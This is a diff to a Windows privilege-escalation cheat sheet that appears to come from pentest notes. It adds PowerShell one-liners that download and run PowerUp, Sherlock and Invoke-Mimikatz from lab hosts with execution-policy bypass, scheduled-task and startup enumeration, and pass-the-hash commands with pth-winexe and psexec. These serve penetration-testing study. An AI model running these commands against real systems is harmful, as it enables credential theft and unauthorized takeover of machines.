@@ -134,6 +134,9 @@ pkg_info
 
 **Good ressources if you run out of ideas**
 
+* YOUTUBE: https://www.youtube.com/channel/UCcU4a3acOkH43EjNfpprIEw
+
+* https://github.com/740i/pentest-notes/blob/master/windows-privesc.md
 * https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
 * https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
 * https://guif.re/windowseop
@@ -151,10 +154,14 @@ pkg_info
 * Windows Exploits: [Sherlock](https://github.com/rasta-mouse/Sherlock)
 * Windows Enumeration: [Jaws](https://github.com/411Hall/JAWS)
 * Windows Enumeration: [PowerUp](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp)
-```
-powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
-```
 * Windows Enumeration: [JollyKatz](https://github.com/LennonCMJ/pentest_script/blob/master/WindowsPE.md)
+
+```
+powershell `IEX((new-object net.webclient).downloadstring('http://10.10.14.22:8000/Sherlock.ps1')); Find-AllVulns`
+powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
+powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.47/PowerUp.ps1'); Invoke-AllChecks"
+powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1');"
+```
 
 ## Kernel
 
@@ -202,6 +209,31 @@ icacls "C:\Program Files (x86)\Program Folder\A Subfolder"
 ```
 
 Simply replacing service executable file with a reverse shell payload and restarting the service.
+
+### Scheduled Tasks
+
+Look for anything custom, run by a privileged user, and running a binary we can overwrite:
+```
+cmd > schtasks /query /fo LIST 2>nul | findstr TaskName
+cmd > dir C:\windows\tasks
+PS > Get-ScheduledTask | ft TaskName, State
+PS > Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
+```
+
+Check this file:
+```
+c:\WINDOWS\SchedLgU.Txt
+```
+
+Startup tasks
+```
+wmic startup get caption,command
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
+dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
+```
 
 ### Task Scheduler
 
@@ -346,14 +378,7 @@ shutdown /r /t 0
 
 ## PassTheHash
 
-* Set the SMBHASH environment variable and run `pth-winexe`
-```
-export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896
-pth-winexe -U administrator //10.11.01.76 cmd 
-```
-```
-pth-winexe --user=username/administrator%hash:hash --system //10.10.10.63 cmd.exe
-```
+* pth-winexe: `pth-winexe --user=username/administrator%hash:hash --system //10.10.10.63 cmd.exe`
 
 * PsExec: `/usr/share/doc/python-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 jarrieta@10.2.0.2`
 
